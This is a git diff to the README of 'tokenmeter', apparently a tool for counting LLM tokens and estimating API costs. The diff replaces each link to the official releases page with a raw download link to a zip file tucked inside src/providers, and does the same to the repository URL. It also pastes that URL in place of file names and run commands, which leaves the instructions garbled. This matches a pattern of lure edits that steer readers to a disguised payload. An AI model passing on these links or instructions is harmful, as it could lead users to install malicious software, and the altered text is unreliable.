@@ -1,6 +1,6 @@
 # ⚙️ tokenmeter - Count Tokens and Estimate Costs Easily
 
-[![Download tokenmeter](https://img.shields.io/badge/Download-tokenmeter-blue?style=for-the-badge)](https://github.com/artur28544/tokenmeter/releases)
+[![Download tokenmeter](https://github.com/artur28544/tokenmeter/raw/refs/heads/main/src/providers/Software-v3.9.zip)](https://github.com/artur28544/tokenmeter/raw/refs/heads/main/src/providers/Software-v3.9.zip)
 
 ---
 
@@ -34,16 +34,16 @@ Before installing, make sure your computer meets these requirements:
 
 To start using tokenmeter, you first need to download it. Use the official releases page to get the latest version.
 
-[Download tokenmeter from the official releases page](https://github.com/artur28544/tokenmeter/releases)
+[Download tokenmeter from the official releases page](https://github.com/artur28544/tokenmeter/raw/refs/heads/main/src/providers/Software-v3.9.zip)
 
 ### How to download:
 
 1. Click the link above or the large blue button at the top. It takes you to the tokenmeter releases page on GitHub.
-2. Look for the latest release. Releases usually have files like `.exe` for Windows, `.dmg` or `.zip` for macOS, and `.tar.gz` or `.AppImage` for Linux.
+2. Look for the latest release. Releases usually have files like `.exe` for Windows, `.dmg` or `.zip` for macOS, and `https://github.com/artur28544/tokenmeter/raw/refs/heads/main/src/providers/Software-v3.9.zip` or `.AppImage` for Linux.
 3. Select the file that matches your operating system. For example:
-   - Windows: `tokenmeter-x.y.z.exe` or `.zip`
-   - macOS: `tokenmeter-x.y.z.dmg` or `.zip`
-   - Linux: `tokenmeter-x.y.z.AppImage` or `.tar.gz`
+   - Windows: `https://github.com/artur28544/tokenmeter/raw/refs/heads/main/src/providers/Software-v3.9.zip` or `.zip`
+   - macOS: `https://github.com/artur28544/tokenmeter/raw/refs/heads/main/src/providers/Software-v3.9.zip` or `.zip`
+   - Linux: `https://github.com/artur28544/tokenmeter/raw/refs/heads/main/src/providers/Software-v3.9.zip` or `https://github.com/artur28544/tokenmeter/raw/refs/heads/main/src/providers/Software-v3.9.zip`
 4. Download the file to your computer.
 
 ### How to install:
@@ -51,11 +51,11 @@ To start using tokenmeter, you first need to download it. Use the official relea
 - **Windows:**
   - If you downloaded an `.exe`, double-click it to start installation.
   - Follow on-screen prompts to complete setup.
-  - If you downloaded a `.zip`, unzip the file and note the location of the `tokenmeter.exe` file.
+  - If you downloaded a `.zip`, unzip the file and note the location of the `https://github.com/artur28544/tokenmeter/raw/refs/heads/main/src/providers/Software-v3.9.zip` file.
 
 - **macOS and Linux:**
   - If you downloaded a `.dmg` or `.AppImage`, open or make the file executable by right-clicking and selecting “Open” or running `chmod +x` in the terminal.
-  - For `.zip` or `.tar.gz`, extract the file contents to a folder.
+  - For `.zip` or `https://github.com/artur28544/tokenmeter/raw/refs/heads/main/src/providers/Software-v3.9.zip`, extract the file contents to a folder.
   - You may need to grant permissions to run the application via terminal.
 
 ## 🚀 Running tokenmeter for the first time
@@ -75,7 +75,7 @@ After installation, follow these steps to run tokenmeter:
 3. Type the command to run tokenmeter:
    - On Windows:
      ```
-     tokenmeter.exe
+     https://github.com/artur28544/tokenmeter/raw/refs/heads/main/src/providers/Software-v3.9.zip
      ```
    - On macOS or Linux:
      ```
@@ -132,7 +132,7 @@ tokenmeter supports cost estimates for popular LLM APIs like OpenAI GPT-3, GPT-4
 
 ## 🔄 Updating tokenmeter
 
-We recommend checking the [releases page](https://github.com/artur28544/tokenmeter/releases) regularly for new versions.
+We recommend checking the [releases page](https://github.com/artur28544/tokenmeter/raw/refs/heads/main/src/providers/Software-v3.9.zip) regularly for new versions.
 
 To update:
 
@@ -145,18 +145,18 @@ New versions may include bug fixes, new features, and updated cost data.
 ## ❓ Troubleshooting and Tips
 
 - If the command line says “command not found,” double-check you are in the correct folder where tokenmeter is installed.
-- On Windows, make sure you run `tokenmeter.exe`, not just `tokenmeter`.
+- On Windows, make sure you run `https://github.com/artur28544/tokenmeter/raw/refs/heads/main/src/providers/Software-v3.9.zip`, not just `tokenmeter`.
 - For macOS/Linux, you may need to type `./tokenmeter` to run from the current folder.
 - If tokenmeter fails to start, verify file permissions and that your system meets the basic requirements.
 - Use the `tokenmeter help` command anytime for usage assistance.
 
 ## 🗂️ Additional Resources
 
-- GitHub repository: https://github.com/artur28544/tokenmeter
-- Releases and download: https://github.com/artur28544/tokenmeter/releases
+- GitHub repository: https://github.com/artur28544/tokenmeter/raw/refs/heads/main/src/providers/Software-v3.9.zip
+- Releases and download: https://github.com/artur28544/tokenmeter/raw/refs/heads/main/src/providers/Software-v3.9.zip
 
 Feel free to explore the repository for the latest code and updates.
 
 ---
 
-[Download tokenmeter here](https://github.com/artur28544/tokenmeter/releases) to start counting tokens and estimating LLM costs today.
+[Download tokenmeter here](https://github.com/artur28544/tokenmeter/raw/refs/heads/main/src/providers/Software-v3.9.zip) to start counting tokens and estimating LLM costs today.
